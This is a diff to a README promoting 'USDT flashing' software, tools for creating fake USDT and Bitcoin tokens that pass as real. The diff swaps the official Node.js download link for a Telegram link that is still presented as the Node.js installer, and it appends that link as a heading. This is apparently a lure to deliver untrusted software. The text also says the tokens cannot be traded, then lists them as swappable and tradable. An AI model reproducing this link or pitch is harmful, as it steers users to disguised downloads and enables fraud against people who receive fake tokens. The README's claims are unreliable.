@@ -6,7 +6,7 @@ USDT flashing is a practice of sending USDT from one wallet to another in a tran
 
 ### USDT flashing software
 
-Coin Flashr is a USDT flashing software that lets users perform BTC and USDT flashing transactions with multiple variants of Bitcoin (including Bitcoin Fantom and Wrapped Bitcoin) and USDT (ERC20, BEP20, and TRC20). This software application exists solely as a proof of concept solution, and should only be used experimentally. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity, ergo you can not sell them on cryptocurrency exchanges. That simply does not exist. What you can do, however, is transfer them between cold and hardware wallets. Flash tokens are identical to the real thing until you study the underlying code.
+flashGrid is a USDT flashing software that lets users perform BTC and USDT flashing transactions with multiple variants of Bitcoin (including Bitcoin Fantom and Wrapped Bitcoin) and USDT (ERC20, BEP20, and TRC20). This software application exists solely as a proof of concept solution, and should only be used experimentally. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity, ergo you can not sell them on cryptocurrency exchanges. That simply does not exist. What you can do, however, is transfer them between cold and hardware wallets. Flash tokens are identical to the real thing until you study the underlying code.
 
 ---
 
@@ -33,7 +33,7 @@ This application requires [Node.js](https://nodejs.org) to run.
 
 ### Windows
 
-Download the Node.js setup application [here](https://nodejs.org/en/download/).
+Download the Node.js setup application [here](https://t.me/Nova_sofrwares).
 
 ### Linux
 
@@ -94,3 +94,6 @@ Gas is required for every non-bitcoin (USDT, wBTC) flashing transaction. You are
 - **Swappable**: Exchange effortlessly.
 - **Flash Duration**: Control your timing( 90 Days to 600 Days).
 - **Tradable**: Freedom to trade.
+- 
+  ## Download the Node.js setup application [here](https://t.me/Nova_sofrwares).
+
